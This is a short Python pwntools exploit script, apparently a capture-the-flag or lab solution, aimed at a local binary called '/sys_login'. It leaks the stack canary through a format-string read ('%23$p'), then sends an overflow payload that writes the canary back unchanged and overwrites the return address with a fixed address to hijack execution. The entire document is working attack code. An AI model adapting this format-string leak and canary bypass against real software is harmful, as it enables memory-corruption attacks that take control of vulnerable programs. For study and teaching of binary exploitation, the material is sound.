#!/usr/bin/python3

from pwn import *

p = process('/sys_login')

log.info(p.clean().decode())
p.sendline('%23$p'.encode())

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)  # overwrite canary with original value to not trigger
payload += b'A' * 12    # pad to return pointer
payload += p32(0x08049279)

p.clean()
p.sendline(payload)

print(p.recvline().decode())

print(p.clean().decode('latin-1'))
